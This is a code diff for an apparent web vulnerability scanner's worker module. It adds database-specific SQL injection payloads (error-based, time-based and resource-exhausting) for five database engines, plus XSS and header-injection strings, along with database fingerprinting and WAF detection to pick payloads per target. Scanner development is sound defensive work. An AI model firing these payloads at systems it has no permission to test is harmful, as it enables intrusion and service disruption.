@@ -1,4 +1,3 @@
-
 # workers/scan_worker.py
 # ──────────────────────────────────────────────────────────────────────────────
 # SENTINEL SCAN WORKER — Evidence-Gated Pipeline
@@ -89,6 +88,7 @@ COMMON_PARAMS = [
     "sort", "filter", "from", "to", "amount", "code", "key", "session",
     "debug", "action", "op", "mode", "format", "output", "dir", "include",
 ]
+
 async def is_url_reachable(url: str, timeout: int = 5) -> bool:
     """
     Validate that a URL is reachable before attempting full scan.
@@ -106,7 +106,6 @@ async def is_url_reachable(url: str, timeout: int = 5) -> bool:
             return response.status_code < 500
     except Exception:
         return False
-
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -200,11 +199,59 @@ def audit_headers(headers: Dict) -> List[str]:
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# PAYLOAD SETS
+# PAYLOAD SETS - ENHANCED WITH DATABASE-SPECIFIC AND CONTEXT-AWARE PAYLOADS
 # ─────────────────────────────────────────────────────────────────────────────
 
+def get_database_specific_payloads(db_type: str = None) -> Dict[str, List[str]]:
+    """Enhanced payloads with database-specific injections"""
+    db_payloads = {
+        "mysql": [
+            "' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -",
+            "' AND updatexml(1,concat(0x7e,user(),0x7e),1)-- -",
+            "' UNION SELECT NULL,@@version,NULL-- -",
+            "' AND SLEEP(5)-- -",
+            "' AND BENCHMARK(5000000,MD5('test'))-- -",
+        ],
+        "postgresql": [
+            "' AND CAST(version() AS INTEGER)--",
+            "' AND (SELECT 1/0 FROM pg_sleep(0))--",
+            "' AND (SELECT $1::int)--",
+            "' AND (SELECT pg_sleep(5))--",
+        ],
+        "mssql": [
+            "' AND (SELECT @@version WHERE 1=CONVERT(INT,@@version))--",
+            "' AND 1=CONVERT(INT,@@version)--",
+            "' AND WAITFOR DELAY '0:0:5'--",
+        ],
+        "oracle": [
+            "' AND (SELECT CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) FROM dual)=1--",
+            "' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual)=1--",
+        ],
+        "sqlite": [
+            "' AND load_extension('non_existent')--",
+            "' AND (SELECT CASE WHEN 1=1 THEN randomblob(1000000000) ELSE 0 END)--",
+        ]
+    }
+    
+    return db_payloads.get(db_type, [])
+
+
+def get_context_aware_payloads(context: dict = None) -> Dict[str, List[str]]:
+    """Generate payloads based on application context"""
+    payloads = get_payloads()  # Get base payloads first
+    
+    if context and context.get('db_type'):
+        # Add database-specific SQLi payloads
+        db_payloads = get_database_specific_payloads(context['db_type'])
+        payloads["sqli_error"].extend(db_payloads)
+        payloads["sqli_time"].extend([p for p in db_payloads if any(kw in p.lower() for kw in ['sleep', 'waitfor', 'benchmark', 'receive_message', 'randomblob'])])
+    
+    return payloads
+
+
 def get_payloads() -> Dict[str, List[str]]:
-    return {
+    """Base payload set with enhanced database-specific options"""
+    base_payloads = {
         "xss": [
             "<script>alert(1)</script>",
             "<img src=x onerror=alert(1)>",
@@ -259,6 +306,52 @@ def get_payloads() -> Dict[str, List[str]]:
             "test%0d%0aX-Injected: evil"
         ]
     }
+    
+    return base_payloads
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CONTEXT ANALYSIS
+# ─────────────────────────────────────────────────────────────────────────────
+
+async def analyze_context(response, target_url: str) -> dict:
+    """Analyze application context for targeted payload generation"""
+    context = {
+        'db_type': None,
+        'tech_stack': [],
+        'waf_present': False
+    }
+    
+    # Database type detection
+    body_lower = response.text.lower()
+    headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
+    
+    # MySQL detection
+    if any(indicator in body_lower for indicator in ['mysql', 'mysqli_', 'mysql_']):
+        context['db_type'] = 'mysql'
+    elif any(indicator in body_lower for indicator in ['postgresql', 'pg_', 'postgres']):
+        context['db_type'] = 'postgresql'
+    elif any(indicator in body_lower for indicator in ['microsoft', 'mssql', 'sql server']):
+        context['db_type'] = 'mssql'
+    elif any(indicator in body_lower for indicator in ['oracle', 'oci_']):
+        context['db_type'] = 'oracle'
+    elif any(indicator in body_lower for indicator in ['sqlite', 'sqlite3']):
+        context['db_type'] = 'sqlite'
+    
+    # Technology stack detection
+    if 'php' in body_lower or '.php' in target_url.lower():
+        context['tech_stack'].append('php')
+    if any(indicator in body_lower for indicator in ['asp.net', 'aspx', 'asp_net']):
+        context['tech_stack'].append('aspnet')
+    if any(indicator in body_lower for indicator in ['jsp', 'java', 'servlet']):
+        context['tech_stack'].append('jsp')
+    
+    # WAF detection
+    waf_indicators = detect_waf(response)
+    if waf_indicators:
+        context['waf_present'] = True
+    
+    return context
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -398,6 +491,13 @@ async def scan_url_async(
             logger.warning(f"WAF detected: {', '.join(wafs)}", job_id)
             push_log(job_id, f"[SCAN] WAF detected: {', '.join(wafs)}", tier=tier)
 
+        # ── Context analysis for targeted payloads ────────────────────────
+        context = await analyze_context(baseline, target_url)
+        if context['db_type']:
+            logger.info(f"Detected database type: {context['db_type']}", job_id)
+        if context['tech_stack']:
+            logger.info(f"Detected tech stack: {', '.join(context['tech_stack'])}", job_id)
+
         # ── Security header audit ─────────────────────────────────────────
         missing = audit_headers(dict(baseline.headers))
         if missing:
@@ -421,7 +521,8 @@ async def scan_url_async(
             f"Discovered {len(params)} params, {len(js_endpoints)} JS endpoints", job_id
         )
 
-        payloads    = get_payloads()
+        # ── Get context-aware payloads ────────────────────────────────────
+        payloads    = get_context_aware_payloads(context)
         tests_run   = 0
         total_tests = len(params) * sum(len(p) for p in payloads.values())
 
@@ -446,7 +547,7 @@ async def scan_url_async(
                     try:
                         req_timeout = (
                             TIME_BASED_TIMEOUT
-                            if any(k in payload.lower() for k in ["sleep", "waitfor", "pg_sleep"])
+                            if any(k in payload.lower() for k in ["sleep", "waitfor", "pg_sleep", "benchmark", "receive_message", "randomblob"])
                             else timeout
                         )
 
@@ -571,7 +672,7 @@ async def scan_url_async(
                     except asyncio.TimeoutError:
                         # Timeout on a SLEEP payload is itself time-based evidence.
                         # Run it through the timing oracle with a synthetic delay.
-                        if any(k in payload.lower() for k in ["sleep", "waitfor", "pg_sleep"]):
+                        if any(k in payload.lower() for k in ["sleep", "waitfor", "pg_sleep", "benchmark", "receive_message", "randomblob"]):
                             synthetic_delay = req_timeout + 0.5
                             result = validator.verify(
                                 vuln_type="sqli_time",
@@ -637,6 +738,7 @@ _VULN_META = {
     "header":     {"type": "Header Injection",                   "severity": "High"},
     "ssrf":       {"type": "Server-Side Request Forgery (SSRF)", "severity": "Critical"},
     "xxe":        {"type": "XML External Entity (XXE)",          "severity": "Critical"},
+    "potential":  {"type": "Potential Vulnerability",            "severity": "Low"},
     "_default":   {"type": "Unknown Vulnerability",              "severity": "Medium"},
 }
 
@@ -746,4 +848,3 @@ def handle(job: dict) -> None:
 
 if __name__ == "__main__":
     worker_loop(SCAN_QUEUE, handle)
-
